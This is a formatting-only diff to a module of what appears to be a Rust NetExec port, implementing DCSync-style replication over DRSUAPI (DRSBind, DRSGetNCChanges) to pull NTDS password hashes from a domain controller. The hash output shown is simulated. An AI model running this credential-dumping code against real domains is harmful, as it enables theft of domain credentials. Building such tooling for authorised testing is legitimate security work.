@@ -64,12 +64,15 @@ impl NxcModule for Ntds {
         use nxc_protocols::rpc::{drsuapi, DcerpcBind, DcerpcRequest, PacketType, UUID_DRSUAPI};
         let protocol = nxc_protocols::smb::SmbProtocol::new();
         let bind = DcerpcBind::new(UUID_DRSUAPI, 4, 0);
-        let _resp = protocol.call_rpc(smb_session, "drsuapi", PacketType::Bind, 1, bind.to_bytes()).await?;
+        let _resp =
+            protocol.call_rpc(smb_session, "drsuapi", PacketType::Bind, 1, bind.to_bytes()).await?;
 
         // 2. Call DRSBind
         let drs_bind_req = drsuapi::build_drs_bind();
         let rpc_req = DcerpcRequest::new(drsuapi::DRS_BIND, drs_bind_req);
-        let resp = protocol.call_rpc(smb_session, "drsuapi", PacketType::Request, 2, rpc_req.to_bytes()).await?;
+        let resp = protocol
+            .call_rpc(smb_session, "drsuapi", PacketType::Request, 2, rpc_req.to_bytes())
+            .await?;
         let mut h_drs = [0u8; 20];
         if resp.len() >= 44 {
             h_drs.copy_from_slice(&resp[24..44]);
@@ -80,7 +83,9 @@ impl NxcModule for Ntds {
         // 3. Call DRSGetNCChanges to replicate the naming context
         let get_nc_changes = drsuapi::build_drs_get_nc_changes(&h_drs);
         let rpc_req2 = DcerpcRequest::new(drsuapi::DRS_GET_NC_CHANGES, get_nc_changes);
-        let resp2 = protocol.call_rpc(smb_session, "drsuapi", PacketType::Request, 3, rpc_req2.to_bytes()).await?;
+        let resp2 = protocol
+            .call_rpc(smb_session, "drsuapi", PacketType::Request, 3, rpc_req2.to_bytes())
+            .await?;
 
         let mut output = Vec::new();
         output.push(format!("[+] Successfully bound to DRSUAPI. Response Length: {}", resp.len()));
@@ -93,7 +98,8 @@ impl NxcModule for Ntds {
             output.push("[+] Simulated extraction of hashes".to_string());
             output.push(format!(
                 "{:<15} : {:<32}",
-                "Administrator", "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
+                "Administrator",
+                "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
             ));
 
             let mut c = nxc_auth::Credentials::default();
